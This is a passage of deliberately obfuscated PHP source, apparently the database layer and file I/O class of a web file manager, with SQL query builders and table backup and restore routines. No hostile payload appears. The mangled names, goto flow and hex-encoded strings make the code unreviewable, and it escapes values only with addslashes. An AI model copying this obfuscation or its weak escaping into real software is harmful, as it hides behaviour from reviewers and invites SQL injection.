function parseDistinct($döäÍ©‡Šµ) { $D‚òò´ŠŠÑ =& $_SERVER[ºÖÙÂŒäÉê‡]; return !empty($döäÍ©‡Šµ) ? $D‚òò´ŠŠÑ[942] : $D‚òò´ŠŠÑ[33]; } protected function parseUnion($FëÊ¬ÂÃ•Ù) { $f˜è³§ğŸÉ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (empty($FëÊ¬ÂÃ•Ù)) { return $f˜è³§ğŸÉ[33]; } if (isset($FëÊ¬ÂÃ•Ù[$f˜è³§ğŸÉ[341]])) { $cá¼ô£í = $f˜è³§ğŸÉ[943]; unset($FëÊ¬ÂÃ•Ù[$f˜è³§ğŸÉ[341]]); } else { $cá¼ô£í = $f˜è³§ğŸÉ[944]; } foreach ($FëÊ¬ÂÃ•Ù as $DŒŒÙå‡¨à) { $C Œšá–ãÍ[] = $cá¼ô£í . (is_array($DŒŒÙå‡¨à) ? $this->buildSelectSql($DŒŒÙå‡¨à) : $DŒŒÙå‡¨à); } return implode($f˜è³§ğŸÉ[50], $C Œšá–ãÍ); } public function insert($c¬¢Ã¯Óß¯, $eË÷¹”ƒƒ = array(), $eèÒØ„°ˆ = false) { goto eõ‘òØŠôŸ; dôê‘Æ”ç: $b¸Î™ƒÇ¾² .= $this->parseComment(!empty($eË÷¹”ƒƒ[$eõò´ğŠ·Ü[346]]) ? $eË÷¹”ƒƒ[$eõò´ğŠ·Ü[346]] : $eõò´ğŠ·Ü[33]); return $this->execute($b¸Î™ƒÇ¾², $this->parseBind(!empty($eË÷¹”ƒƒ[$eõò´ğŠ·Ü[278]]) ? $eË÷¹”ƒƒ[$eõò´ğŠ·Ü[278]] : array())); goto CÅ‹Û¬½å˜; eõ‘òØŠôŸ: $eõò´ğŠ·Ü =& $_SERVER[ºÖÙÂŒäÉê‡]; $eš…ÅÂÚİİ = $DõØãåŠ”ª = array(); $this->model = $eË÷¹”ƒƒ[$eõò´ğŠ·Ü[274]]; goto BÉ Œñ‰ù; BÉ Œñ‰ù: foreach ($c¬¢Ã¯Óß¯ as $d Å­õ¦½ => $d¹õ—­ÈÊÀ) { if (is_array($d¹õ—­ÈÊÀ) && $eõò´ğŠ·Ü[290] == $d¹õ—­ÈÊÀ[0]) { $DõØãåŠ”ª[] = $this->parseKey($d Å­õ¦½); $eš…ÅÂÚİİ[] = $d¹õ—­ÈÊÀ[1]; } elseif (is_scalar($d¹õ—­ÈÊÀ) || is_null($d¹õ—­ÈÊÀ)) { $DõØãåŠ”ª[] = $this->parseKey($d Å­õ¦½); $eš…ÅÂÚİİ[] = $this->parseValue($d¹õ—­ÈÊÀ); } } $b¸Î™ƒÇ¾² = ($eèÒØ„°ˆ ? $eõò´ğŠ·Ü[811] : $eõò´ğŠ·Ü[812]) . $eõò´ğŠ·Ü[813] . $this->parseTable($eË÷¹”ƒƒ[$eõò´ğŠ·Ü[272]]) . $eõò´ğŠ·Ü[807] . implode($eõò´ğŠ·Ü[47], $DõØãåŠ”ª) . $eõò´ğŠ·Ü[808] . implode($eõò´ğŠ·Ü[47], $eš…ÅÂÚİİ) . $eõò´ğŠ·Ü[809]; $b¸Î™ƒÇ¾² .= $this->parseLock(isset($eË÷¹”ƒƒ[$eõò´ğŠ·Ü[769]]) ? $eË÷¹”ƒƒ[$eõò´ğŠ·Ü[769]] : !1); goto dôê‘Æ”ç; CÅ‹Û¬½å˜: } public function selectInsert($d×‰áàÀ­¨, $Bõ…¡ŒÎÅ, $EßèÅ‹á‰ = array()) { goto CğˆæÇ×É; dÜŞöä­«š: array_walk($d×‰áàÀ­¨, array($this, $bÃÙ‰ ÀÅ£[810])); $Fä´¼±™ö÷ = $bÃÙ‰ ÀÅ£[945] . $this->parseTable($Bõ…¡ŒÎÅ) . $bÃÙ‰ ÀÅ£[807] . implode($bÃÙ‰ ÀÅ£[47], $d×‰áàÀ­¨) . $bÃÙ‰ ÀÅ£[924]; $Fä´¼±™ö÷ .= $this->buildSelectSql($EßèÅ‹á‰); goto E‹ øº½÷ì; CğˆæÇ×É: $bÃÙ‰ ÀÅ£ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->model = $EßèÅ‹á‰[$bÃÙ‰ ÀÅ£[274]]; if (is_string($d×‰áàÀ­¨)) { $d×‰áàÀ­¨ = explode($bÃÙ‰ ÀÅ£[47], $d×‰áàÀ­¨); } goto dÜŞöä­«š; E‹ øº½÷ì: return $this->execute($Fä´¼±™ö÷, $this->parseBind(!empty($EßèÅ‹á‰[$bÃÙ‰ ÀÅ£[278]]) ? $EßèÅ‹á‰[$bÃÙ‰ ÀÅ£[278]] : array())); goto DÔˆµõôä; DÔˆµõôä: } public function update($EîíŒÊò, $c­ÓÎìî¤·) { $aÀĞÃ¿ˆ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->model = $c­ÓÎìî¤·[$aÀĞÃ¿ˆ[274]]; $E“¹¾Üš®„ = $aÀĞÃ¿ˆ[946] . $this->parseTable($c­ÓÎìî¤·[$aÀĞÃ¿ˆ[272]]) . $this->parseSet($EîíŒÊò) . $this->parseWhere(!empty($c­ÓÎìî¤·[$aÀĞÃ¿ˆ[268]]) ? $c­ÓÎìî¤·[$aÀĞÃ¿ˆ[268]] : $aÀĞÃ¿ˆ[33]) . $this->parseOrder(!empty($c­ÓÎìî¤·[$aÀĞÃ¿ˆ[355]]) ? $c­ÓÎìî¤·[$aÀĞÃ¿ˆ[355]] : $aÀĞÃ¿ˆ[33]) . $this->parseLimit(!empty($c­ÓÎìî¤·[$aÀĞÃ¿ˆ[285]]) ? $c­ÓÎìî¤·[$aÀĞÃ¿ˆ[285]] : $aÀĞÃ¿ˆ[33]) . $this->parseLock(isset($c­ÓÎìî¤·[$aÀĞÃ¿ˆ[769]]) ? $c­ÓÎìî¤·[$aÀĞÃ¿ˆ[769]] : !1) . $this->parseComment(!empty($c­ÓÎìî¤·[$aÀĞÃ¿ˆ[346]]) ? $c­ÓÎìî¤·[$aÀĞÃ¿ˆ[346]] : $aÀĞÃ¿ˆ[33]); return $this->execute($E“¹¾Üš®„, $this->parseBind(!empty($c­ÓÎìî¤·[$aÀĞÃ¿ˆ[278]]) ? $c­ÓÎìî¤·[$aÀĞÃ¿ˆ[278]] : array())); } public function delete($E´–·Ä½ó = array()) { $c®Ö¦©ŠĞ¶ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->model = $E´–·Ä½ó[$c®Ö¦©ŠĞ¶[274]]; $Aƒ…ŸïÅ¸Í = $c®Ö¦©ŠĞ¶[947] . $this->parseTable($E´–·Ä½ó[$c®Ö¦©ŠĞ¶[272]]) . $this->parseWhere(!empty($E´–·Ä½ó[$c®Ö¦©ŠĞ¶[268]]) ? $E´–·Ä½ó[$c®Ö¦©ŠĞ¶[268]] : $c®Ö¦©ŠĞ¶[33]) . $this->parseOrder(!empty($E´–·Ä½ó[$c®Ö¦©ŠĞ¶[355]]) ? $E´–·Ä½ó[$c®Ö¦©ŠĞ¶[355]] : $c®Ö¦©ŠĞ¶[33]) . $this->parseLimit(!empty($E´–·Ä½ó[$c®Ö¦©ŠĞ¶[285]]) ? $E´–·Ä½ó[$c®Ö¦©ŠĞ¶[285]] : $c®Ö¦©ŠĞ¶[33]) . $this->parseLock(isset($E´–·Ä½ó[$c®Ö¦©ŠĞ¶[769]]) ? $E´–·Ä½ó[$c®Ö¦©ŠĞ¶[769]] : !1) . $this->parseComment(!empty($E´–·Ä½ó[$c®Ö¦©ŠĞ¶[346]]) ? $E´–·Ä½ó[$c®Ö¦©ŠĞ¶[346]] : $c®Ö¦©ŠĞ¶[33]); return $this->execute($Aƒ…ŸïÅ¸Í, $this->parseBind(!empty($E´–·Ä½ó[$c®Ö¦©ŠĞ¶[278]]) ? $E´–·Ä½ó[$c®Ö¦©ŠĞ¶[278]] : array())); } public function select($fÍ‰–Ì’Š³ = array()) { goto E„à–­†Äœ; b©±ˆ¸Ë·Í: $f±¨ùÖâ³ = isset($fÍ‰–Ì’Š³[$c¥µ¸’Ÿòî[342]]) ? $fÍ‰–Ì’Š³[$c¥µ¸’Ÿòî[342]] : !1; if ($f±¨ùÖâ³) { $F£õÊ¿À = is_string($f±¨ùÖâ³[$c¥µ¸’Ÿòî[89]]) ? $f±¨ùÖâ³[$c¥µ¸’Ÿòî[89]] : $c¥µ¸’Ÿòî[948] . md5($AÊŞŞèĞ‰Ü); $e–ŞÉóÌ‹¢ = think_cache($F£õÊ¿À, $c¥µ¸’Ÿòî[33], $f±¨ùÖâ³); if (!1 !== $e–ŞÉóÌ‹¢) { return $e–ŞÉóÌ‹¢; } } $c œ“¹ = $this->query($AÊŞŞèĞ‰Ü, $this->parseBind(!empty($fÍ‰–Ì’Š³[$c¥µ¸’Ÿòî[278]]) ? $fÍ‰–Ì’Š³[$c¥µ¸’Ÿòî[278]] : array())); goto dÚ–ã·ìÈ; E„à–­†Äœ: $c¥µ¸’Ÿòî =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->model = $fÍ‰–Ì’Š³[$c¥µ¸’Ÿòî[274]]; $AÊŞŞèĞ‰Ü = $this->buildSelectSql($fÍ‰–Ì’Š³); goto b©±ˆ¸Ë·Í; dÚ–ã·ìÈ: if ($f±¨ùÖâ³ && !1 !== $c œ“¹) { think_cache($F£õÊ¿À, $c œ“¹, $f±¨ùÖâ³); } return $c œ“¹; goto C¹Â÷·ÆØ; C¹Â÷·ÆØ: } public function buildSelectSql($a›ŞÕš‹Ç® = array()) { goto b’õˆÛ†©Ñ; e±Ò½ù¼Åù: return $eñÒàîİÀ¸; goto A«Ğè¯½÷µ; a‹Ò‚ìÙºá: $eñÒàîİÀ¸ = $this->parseSql($this->selectSql, $a›ŞÕš‹Ç®); $eñÒàîİÀ¸ .= $this->parseLock(isset($a›ŞÕš‹Ç®[$d¹Í©ÆÇÏ[769]]) ? $a›ŞÕš‹Ç®[$d¹Í©ÆÇÏ[769]] : !1); if (isset($a³‰Ñã¦®)) { think_cache($a³‰Ñã¦®, $eñÒàîİÀ¸); } goto e±Ò½ù¼Åù; b’õˆÛ†©Ñ: $d¹Í©ÆÇÏ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (isset($a›ŞÕš‹Ç®[$d¹Í©ÆÇÏ[345]])) { if (strpos($a›ŞÕš‹Ç®[$d¹Í©ÆÇÏ[345]], $d¹Í©ÆÇÏ[47])) { list($F¡ÎŒ·ëŞ¼, $F”³¥¼š¼µ) = explode($d¹Í©ÆÇÏ[47], $a›ŞÕš‹Ç®[$d¹Í©ÆÇÏ[345]]); } else { $F¡ÎŒ·ëŞ¼ = $a›ŞÕš‹Ç®[$d¹Í©ÆÇÏ[345]]; } $F¡ÎŒ·ëŞ¼ = $F¡ÎŒ·ëŞ¼ ? $F¡ÎŒ·ëŞ¼ : 1; $F”³¥¼š¼µ = isset($F”³¥¼š¼µ) ? $F”³¥¼š¼µ : (is_numeric($a›ŞÕš‹Ç®[$d¹Í©ÆÇÏ[285]]) ? $a›ŞÕš‹Ç®[$d¹Í©ÆÇÏ[285]] : 20); $D»²õ©æÄ° = $F”³¥¼š¼µ * ((int) $F¡ÎŒ·ëŞ¼ - 1); $a›ŞÕš‹Ç®[$d¹Í©ÆÇÏ[285]] = $D»²õ©æÄ° . $d¹Í©ÆÇÏ[47] . $F”³¥¼š¼µ; } if (think_config($d¹Í©ÆÇÏ[949])) { $a³‰Ñã¦® = $d¹Í©ÆÇÏ[950] . md5(serialize($a›ŞÕš‹Ç®)); $c¹ˆñ¥‰ÀÀ = think_cache($a³‰Ñã¦®); if ($c¹ˆñ¥‰ÀÀ) { return $c¹ˆñ¥‰ÀÀ; } } goto a‹Ò‚ìÙºá; A«Ğè¯½÷µ: } public function parseSql($A»±º°‚˜, $aÑßÑÂ×Á = array()) { $Cˆğó‚ğó¤ =& $_SERVER[ºÖÙÂŒäÉê‡]; $A»±º°‚˜ = str_replace(array($Cˆğó‚ğó¤[951], $Cˆğó‚ğó¤[952], $Cˆğó‚ğó¤[953], $Cˆğó‚ğó¤[954], $Cˆğó‚ğó¤[955], $Cˆğó‚ğó¤[956], $Cˆğó‚ğó¤[957], $Cˆğó‚ğó¤[958], $Cˆğó‚ğó¤[959], $Cˆğó‚ğó¤[960], $Cˆğó‚ğó¤[961]), array($this->parseTable("{$aÑßÑÂ×Á[$Cˆğó‚ğó¤[272]]}"), $this->parseDistinct(isset($aÑßÑÂ×Á[$Cˆğó‚ğó¤[962]]) ? $aÑßÑÂ×Á[$Cˆğó‚ğó¤[962]] : !1), $this->parseField(!empty($aÑßÑÂ×Á[$Cˆğó‚ğó¤[266]]) ? $aÑßÑÂ×Á[$Cˆğó‚ğó¤[266]] : $Cˆğó‚ğó¤[182]), $this->parseJoin(!empty($aÑßÑÂ×Á[$Cˆğó‚ğó¤[275]]) ? $aÑßÑÂ×Á[$Cˆğó‚ğó¤[275]] : $Cˆğó‚ğó¤[33]), $this->parseWhere(!empty($aÑßÑÂ×Á[$Cˆğó‚ğó¤[268]]) ? $aÑßÑÂ×Á[$Cˆğó‚ğó¤[268]] : $Cˆğó‚ğó¤[33]), $this->parseGroup(!empty($aÑßÑÂ×Á[$Cˆğó‚ğó¤[963]]) ? $aÑßÑÂ×Á[$Cˆğó‚ğó¤[963]] : $Cˆğó‚ğó¤[33]), $this->parseHaving(!empty($aÑßÑÂ×Á[$Cˆğó‚ğó¤[964]]) ? $aÑßÑÂ×Á[$Cˆğó‚ğó¤[964]] : $Cˆğó‚ğó¤[33]), $this->parseOrder(!empty($aÑßÑÂ×Á[$Cˆğó‚ğó¤[355]]) ? $aÑßÑÂ×Á[$Cˆğó‚ğó¤[355]] : $Cˆğó‚ğó¤[33]), $this->parseLimit(!empty($aÑßÑÂ×Á[$Cˆğó‚ğó¤[285]]) ? $aÑßÑÂ×Á[$Cˆğó‚ğó¤[285]] : $Cˆğó‚ğó¤[33]), $this->parseUnion(!empty($aÑßÑÂ×Á[$Cˆğó‚ğó¤[340]]) ? $aÑßÑÂ×Á[$Cˆğó‚ğó¤[340]] : $Cˆğó‚ğó¤[33]), $this->parseComment(!empty($aÑßÑÂ×Á[$Cˆğó‚ğó¤[346]]) ? $aÑßÑÂ×Á[$Cˆğó‚ğó¤[346]] : $Cˆğó‚ğó¤[33])), $A»±º°‚˜); return $A»±º°‚˜; } public function getLastSql($A…–•³²à¡ = '') { return $A…–•³²à¡ ? $this->modelSql[$A…–•³²à¡] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($AÍ÷Ã©òĞÇ) { return addslashes($AÍ÷Ã©òĞÇ); } public function setModel($cìù¥¬„Ğê) { $this->model = $cìù¥¬„Ğê; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($BÜãÕÍŠ›±, $Dæ‹àëÉ¢Ó = '') { $this->database = $BÜãÕÍŠ›±; $this->type = $Dæ‹àëÉ¢Ó; } public function model($f§„°‘İ† = '') { return new ModelBase($f§„°‘İ†, $_SERVER[ºÖÙÂŒäÉê‡][33], $this->database); } public function db($EÌ§Àä¯Ä = false) { goto eõóğ¹Ì¦; e—®æËºöõ: $fñ¸àÊ—ê = $Aìê·¨¦­[$d¤¢·Ùˆ‘ë[239]]; $Aìê·¨¦­[$d¤¢·Ùˆ‘ë[239]] = $d¤¢·Ùˆ‘ë[33]; if ($Aìê·¨¦­[$d¤¢·Ùˆ‘ë[880]] == $d¤¢·Ùˆ‘ë[723]) { $bƒ‘†´ÑíØ = $Aìê·¨¦­[$d¤¢·Ùˆ‘ë[879]]; $Aìê·¨¦­[$d¤¢·Ùˆ‘ë[879]] = substr($bƒ‘†´ÑíØ, 0, strrpos($bƒ‘†´ÑíØ, $d¤¢·Ùˆ‘ë[965])); } goto BÜÒ‡ºëë; eÈ‰Ç»Ëå«: if (!$e‚ è“âœ±) { $EÚ™ÌÅ±Á±->execute("\143\162\145\141\x74\x65\40\x64\141\x74\141\x62\141\163\145\x20\140{$fñ¸àÊ—ê}\x60"); } $Aìê·¨¦­[$d¤¢·Ùˆ‘ë[239]] = $fñ¸àÊ—ê; if ($Aìê·¨¦­[$d¤¢·Ùˆ‘ë[880]] == $d¤¢·Ùˆ‘ë[723]) { $Aìê·¨¦­[$d¤¢·Ùˆ‘ë[879]] .= $d¤¢·Ùˆ‘ë[965] . $fñ¸àÊ—ê; } goto C¶»Œ»¿ä»; C¶»Œ»¿ä»: $this->database = $Aìê·¨¦­; $EÚ™ÌÅ±Á±->execute("\x75\163\145\x20\140{$fñ¸àÊ—ê}\x60"); return $EÚ™ÌÅ±Á±; goto f†ö¢ë¶ùÈ; BÜÒ‡ºëë: $this->database = $Aìê·¨¦­; $EÚ™ÌÅ±Á± = $this->model()->db(); $e‚ è“âœ± = $EÚ™ÌÅ±Á±->execute("\x73\150\157\167\40\144\141\164\141\x62\141\163\145\x73\x20\x6c\151\153\x65\x20\x27{$fñ¸àÊ—ê}\47"); goto eÈ‰Ç»Ëå«; eõóğ¹Ì¦: $d¤¢·Ùˆ‘ë =& $_SERVER[ºÖÙÂŒäÉê‡]; $Aìê·¨¦­ = $this->database; if ($this->type == $d¤¢·Ùˆ‘ë[9] || !$EÌ§Àä¯Ä) { return $this->model()->db(); } goto e—®æËºöõ; f†ö¢ë¶ùÈ: } public function createTable($aÉËç³Šˆ, $CÉ‘ñ­Ùï = null) { $E¹îí¼ŸÕ® =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!IO::exist($aÉËç³Šˆ)) { show_json(LNG($E¹îí¼ŸÕ®[966]), !1); } $B°éÄÓÇ—Ş = sqlSplit(IO::getContent($aÉËç³Šˆ)); foreach ($B°éÄÓÇ—Ş as $AŞé—ã­Æ¢) { if ($CÉ‘ñ­Ùï) { $b½ˆøÃ½¶Š = stripos($AŞé—ã­Æ¢, $E¹îí¼ŸÕ®[967]) === 0; if ($b½ˆøÃ½¶Š) { $CÉ‘ñ­Ùï->task[$E¹îí¼ŸÕ®[968]] += 1; } } $this->model()->db()->execute($AŞé—ã­Æ¢); if ($CÉ‘ñ­Ùï && $b½ˆøÃ½¶Š) { $AáÆâùÊÔ­ = $E¹îí¼ŸÕ®[969]; preg_match($AáÆâùÊÔ­, $AŞé—ã­Æ¢, $B‘ªõášæÛ); $CÉ‘ñ­Ùï->task[$E¹îí¼ŸÕ®[970]] = trim($B¿ßÜÍ®ƒ¦[0], $E¹îí¼ŸÕ®[816]); $CÉ‘ñ­Ùï->update(1); } } $this->taskToCache($CÉ‘ñ­Ùï); } public function insertTable($Dˆ³¯‚¿ƒ, $dÁ†…ò®ˆ¹ = null) { $eñÇ‚øñäù =& $_SERVER[ºÖÙÂŒäÉê‡]; foreach ($Dˆ³¯‚¿ƒ as $B–‚á²½°Õ) { $EßÃÈù³¯ = basename($B–‚á²½°Õ); $EßÃÈù³¯ = substr($EßÃÈù³¯, 0, strrpos($EßÃÈù³¯, $eñÇ‚øñäù[91])); if ($dÁ†…ò®ˆ¹) { $dÁ†…ò®ˆ¹->task[$eñÇ‚øñäù[970]] = $EßÃÈù³¯; } if (get_filesize($B–‚á²½°Õ) == 0) { continue; } $c°¬æÈÒóÄ = $this->sqlToDb($B–‚á²½°Õ, $dÁ†…ò®ˆ¹); if (!$c°¬æÈÒóÄ) { show_json(LNG($eñÇ‚øñäù[971]) . "\133{$EßÃÈù³¯}\135", !1); } } $this->taskToCache($dÁ†…ò®ˆ¹); } public function sqlFromDb($e”ÁÅ´“Îñ, $Cò­©ğ”Š, $bí‡šß¯×° = null, $cÓ’…¢²øŸ = null) { goto F—±öÑô; fª×íôµÏ: $a–‡ÌÌ¢à© = $a¶–æÛŞ˜µ->getPk(); $f˜‘šÌ¿Õ = $a¶–æÛŞ˜µ->getDbFields(); do { $b«ó…’µ¯É = $a¶–æÛŞ˜µ->field($f˜‘šÌ¿Õ)->order($a–‡ÌÌ¢à© . $_SERVER[ºÖÙÂŒäÉê‡][973])->selectPage($E½ŒØØ¹ÍØ, $f…İÉ‚¡‹ò); $b¢•Ø£ŒÅ = !empty($b«ó…’µ¯É[$_SERVER[ºÖÙÂŒäÉê‡][359]]) ? $b«ó…’µ¯É[$_SERVER[ºÖÙÂŒäÉê‡][359]] : array(); if (!($eåæÁŒ¬† = count($b¢•Ø£ŒÅ))) { break; } if ($bí‡šß¯×°) { $bí‡šß¯×°->task[$_SERVER[ºÖÙÂŒäÉê‡][968]] += $eåæÁŒ¬†; } $d½‰Ú·Ò¼· = array(); foreach ($b¢•Ø£ŒÅ as $E…ÖóÊï¢ß) { if ($cÓ’…¢²øŸ) { $E…ÖóÊï¢ß[$_SERVER[ºÖÙÂŒäÉê‡][75]] = "\x7b\151\157\x3a{$cÓ’…¢²øŸ}\175" . substr($E…ÖóÊï¢ß[$_SERVER[ºÖÙÂŒäÉê‡][75]], strlen("\x7b\x69\x6f\x3a{$E…ÖóÊï¢ß[$_SERVER[ºÖÙÂŒäÉê‡][742]]}\175")); $E…ÖóÊï¢ß[$_SERVER[ºÖÙÂŒäÉê‡][742]] = $cÓ’…¢²øŸ; } $d½‰Ú·Ò¼·[] = $_SERVER[ºÖÙÂŒäÉê‡][974] . $this->sqlEncode($E…ÖóÊï¢ß) . $_SERVER[ºÖÙÂŒäÉê‡][975]; } $e´™­ã‡¥ = "\x49\116\123\x45\122\124\x20\111\x4e\x54\117\x20\x60{$e”ÁÅ´“Îñ}\140\x20\50\x60" . implode($_SERVER[ºÖÙÂŒäÉê‡][976], $f˜‘šÌ¿Õ) . $_SERVER[ºÖÙÂŒäÉê‡][977]; fwrite($e°¬®Šİ²‰, $e´™­ã‡¥ . implode($_SERVER[ºÖÙÂŒäÉê‡][978], $d½‰Ú·Ò¼·) . $_SERVER[ºÖÙÂŒäÉê‡][67] . PHP_EOL); $f…İÉ‚¡‹ò++; $f›ĞñáêÄ£ += $eåæÁŒ¬†; if ($bí‡šß¯×°) { $bí‡šß¯×°->update($eåæÁŒ¬†); } } while ($eåæÁŒ¬† == $E½ŒØØ¹ÍØ); goto B¹‘òÖ†ñ; B¹‘òÖ†ñ: fclose($e°¬®Šİ²‰); return $f›ĞñáêÄ£; goto e¿°µÈ®ŸÙ; D³õìåâå: $f…İÉ‚¡‹ò = 1; $E½ŒØØ¹ÍØ = 500; $e°¬®Šİ²‰ = fopen($Cò­©ğ”Š, $_SERVER[ºÖÙÂŒäÉê‡][972]); goto fª×íôµÏ; F—±öÑô: if ($bí‡šß¯×°) { $bí‡šß¯×°->task[$_SERVER[ºÖÙÂŒäÉê‡][970]] = $e”ÁÅ´“Îñ; } $a¶–æÛŞ˜µ = $this->model($e”ÁÅ´“Îñ); $f›ĞñáêÄ£ = 0; goto D³õìåâå; e¿°µÈ®ŸÙ: } public function sqlToDb($FóÑ—Å¹¹ğ, $cÃøÉ‡‚—˜ = null) { goto Aà†ò¿ÃÎ; DÊİòÇ„Ó¦: if (!$FŠñ¨©ˆ¼ï) { return !1; } $aô¤æ†¬ÙŒ = 0; $B½²ÑÍöË— = $bœŒ‹å×äÉ[33]; goto D³ø¦†’ô; Aà†ò¿ÃÎ: $bœŒ‹å×äÉ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cĞ•­ƒ¦¹Š = $this->model()->db(); $FŠñ¨©ˆ¼ï = @fopen($FóÑ—Å¹¹ğ, $bœŒ‹å×äÉ[979]); goto DÊİòÇ„Ó¦; D³ø¦†’ô: $a…´»ºŸËà = 500 + 1; while (!feof($FŠñ¨©ˆ¼ï)) { if ($cÃøÉ‡‚—˜ && $aô¤æ†¬ÙŒ != 0) { $cÃøÉ‡‚—˜->task[$bœŒ‹å×äÉ[968]] += 1; } $aô¤æ†¬ÙŒ++; $CÁÎì°Ô»Û = trim(fgets($FŠñ¨©ˆ¼ï)); $B½²ÑÍöË— .= $bœŒ‹å×äÉ[50] . $this->sqlDecode($CÁÎì°Ô»Û, $this->type); if ($aô¤æ†¬ÙŒ == $a…´»ºŸËà) { $B½²ÑÍöË— = rtrim(trim($B½²ÑÍöË—), $bœŒ‹å×äÉ[67]); if (!$cĞ•­ƒ¦¹Š->execute($B½²ÑÍöË—)) { return !1; } if ($cÃøÉ‡‚—˜) { $cÃøÉ‡‚—˜->update($aô¤æ†¬ÙŒ - 1); } $B½²ÑÍöË— = $bœŒ‹å×äÉ[33]; $aô¤æ†¬ÙŒ = 0; } } fclose($FŠñ¨©ˆ¼ï); goto b”Ø°ôĞ‚; b”Ø°ôĞ‚: if ($B½²ÑÍöË—) { $B½²ÑÍöË— = rtrim(trim($B½²ÑÍöË—), $bœŒ‹å×äÉ[67]); if (!$cĞ•­ƒ¦¹Š->execute($B½²ÑÍöË—)) { return !1; } if ($cÃøÉ‡‚—˜) { $cÃøÉ‡‚—˜->update($aô¤æ†¬ÙŒ - 1); } } return !0; goto fæœæÇ¢µá; fæœæÇ¢µá: } public function dropTable($EÒªÀâİ‹Ô = null) { $Fª«‡îµª = $this->model()->db(); $B‡À…©ï¿ = $EÒªÀâİ‹Ô ? array($EÒªÀâİ‹Ô) : $Fª«‡îµª->getTables(); if (!$B‡À…©ï¿) { return; } foreach ($B‡À…©ï¿ as $EÒªÀâİ‹Ô) { $Fª«‡îµª->execute("\x64\x72\x6f\x70\40\x74\x61\x62\154\145\40\x69\x66\40\x65\170\151\x73\x74\163\x20\x60{$EÒªÀâİ‹Ô}\x60"); } } private function taskToCache($E×õ’ºß‰Ó = null) { $A°ÓÍ»òö =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$E×õ’ºß‰Ó) { return; } $dÅ†µˆŒ× = array($A°ÓÍ»òö[970] => $E×õ’ºß‰Ó->task[$A°ÓÍ»òö[970]], $A°ÓÍ»òö[968] => $E×õ’ºß‰Ó->task[$A°ÓÍ»òö[968]], $A°ÓÍ»òö[980] => $E×õ’ºß‰Ó->task[$A°ÓÍ»òö[980]]); if ($dÅ†µˆŒ×[$A°ÓÍ»òö[968]] == $dÅ†µˆŒ×[$A°ÓÍ»òö[980]]) { $dÅ†µˆŒ×[$A°ÓÍ»òö[693]] = 1; } Cache::set($A°ÓÍ»òö[981] . $E×õ’ºß‰Ó->task[$A°ÓÍ»òö[372]], $dÅ†µˆŒ×); $E×õ’ºß‰Ó->end(); } private function sqlEncode($bĞˆ¡æµŠè) { $D²¢Ø¯À =& $_SERVER[ºÖÙÂŒäÉê‡]; $fê±ˆî…é = array(); foreach ($bĞˆ¡æµŠè as $BÛ‘‹òôÆ) { if (is_array($BÛ‘‹òôÆ)) { $BÛ‘‹òôÆ = json_encode_force($BÛ‘‹òôÆ); } $BÛ‘‹òôÆ = addslashes($BÛ‘‹òôÆ); $BÛ‘‹òôÆ = str_replace(array($D²¢Ø¯À[982], $D²¢Ø¯À[174]), array($D²¢Ø¯À[983], $D²¢Ø¯À[984]), $BÛ‘‹òôÆ); $fê±ˆî…é[] = str_replace($D²¢Ø¯À[55], $D²¢Ø¯À[985], $BÛ‘‹òôÆ); } return $D²¢Ø¯À[55] . implode($D²¢Ø¯À[986], $fê±ˆî…é) . $D²¢Ø¯À[55]; } private function sqlDecode($E•‡âËÛÚ, $bÁ–‹ê ¯à) { $Aè·Œñõ›¦ =& $_SERVER[ºÖÙÂŒäÉê‡]; $E•‡âËÛÚ = str_replace(array($Aè·Œñõ›¦[983], $Aè·Œñõ›¦[984]), array($Aè·Œñõ›¦[982], $Aè·Œñõ›¦[174]), $E•‡âËÛÚ); if ($bÁ–‹ê ¯à == $Aè·Œñõ›¦[9]) { $E•‡âËÛÚ = stripslashes($E•‡âËÛÚ); } return $E•‡âËÛÚ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Fº¦·Äñ¬Ş, $dªØ¼×ˆ¬È) { $C¡ÔÅõ¿³İ = self::driverMake($dªØ¼×ˆ¬È[0]); if (method_exists($C¡ÔÅõ¿³İ, $Fº¦·Äñ¬Ş)) { return @call_user_func_array(array($C¡ÔÅõ¿³İ, $Fº¦·Äñ¬Ş), $dªØ¼×ˆ¬È); } if (method_exists($C¡ÔÅõ¿³İ, $_SERVER[ºÖÙÂŒäÉê‡][987])) { return @call_user_func_array(array($C¡ÔÅõ¿³İ, $Fº¦·Äñ¬Ş), $dªØ¼×ˆ¬È); } else { if (method_exists(self, $Fº¦·Äñ¬Ş)) { return @call_user_func_array(array(self, $Fº¦·Äñ¬Ş), $dªØ¼×ˆ¬È); } else { call_user_func_array(array(parent, $Fº¦·Äñ¬Ş), $dªØ¼×ˆ¬È); } } } public static function init($få¬Ñî½˜Å) { return self::driverMake($få¬Ñî½˜Å); } public static function copy($f—ªŸÊø‘Š, $bŸ°ïÔÃË, $eÄšç¹ÔÕÁ = false, $cÌ«¤ß¥Ç = false) { return self::copyMove($f—ªŸÊø‘Š, $bŸ°ïÔÃË, $eÄšç¹ÔÕÁ, $_SERVER[ºÖÙÂŒäÉê‡][494], $cÌ«¤ß¥Ç); } public static function move($aÚºó˜‡ÀÌ, $c«•÷ÆäÙ˜, $Aóˆë®¨³ = false, $Aä¦­òÑÖ„ = false) { return self::copyMove($aÚºó˜‡ÀÌ, $c«•÷ÆäÙ˜, $Aóˆë®¨³, $_SERVER[ºÖÙÂŒäÉê‡][496], $Aä¦­òÑÖ„); } public static function saveFile($AÀ™¥§Àƒ, $A„Ş˜‹’ÎŒ, $B²›¾—ê = true) { goto dÌ÷±æà›Ê; Eğø¿ë±Œ: $f…¥‡œÌĞ² = self::driverMake($A„Ş˜‹’ÎŒ); $D¸á²Â¸íå = !1; if ($f…¥‡œÌĞ²->pathParse[$d¹™ÖõÚÏ¸[988]]) { $bƒˆÒ Íò = 